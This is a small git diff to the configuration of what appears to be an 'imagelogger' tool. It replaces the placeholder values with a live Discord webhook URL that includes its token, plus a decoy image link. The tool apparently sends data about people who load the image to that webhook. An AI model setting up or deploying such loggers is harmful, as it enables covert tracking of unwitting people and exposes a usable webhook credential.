@@ -13,8 +13,8 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/your/webhook",
-    "image": "https://link-to-your-image.here", # You can also have a custom image by using a URL argument
+    "webhook": "https://discord.com/api/webhooks/1352551496981549107/UhP3-HUj7UlRpV6bx9-ptDoMg17tvKtrWmL-tNXWDXBVoHyhCsH3fT9lZFJTnmR6fiZZ",
+    "image": "https://images-wixmp-ed30a86b8c4ca887773594c2.wixmp.com/f/24ff0915-0bc8-4a1b-93a3-7e286e2d7186/ddtq4pf-a1851538-cc57-472a-8c7e-ad780063232e.png?token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJ1cm46YXBwOjdlMGQxODg5ODIyNjQzNzNhNWYwZDQxNWVhMGQyNmUwIiwiaXNzIjoidXJuOmFwcDo3ZTBkMTg4OTgyMjY0MzczYTVmMGQ0MTVlYTBkMjZlMCIsIm9iaiI6W1t7InBhdGgiOiJcL2ZcLzI0ZmYwOTE1LTBiYzgtNGExYi05M2EzLTdlMjg2ZTJkNzE4NlwvZGR0cTRwZi1hMTg1MTUzOC1jYzU3LTQ3MmEtOGM3ZS1hZDc4MDA2MzIzMmUucG5nIn1dXSwiYXVkIjpbInVybjpzZXJ2aWNlOmZpbGUuZG93bmxvYWQiXX0.fSmxnI3mvx3A1ipwkAoqV4rMagDzNAvhcePa09MWfcI", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
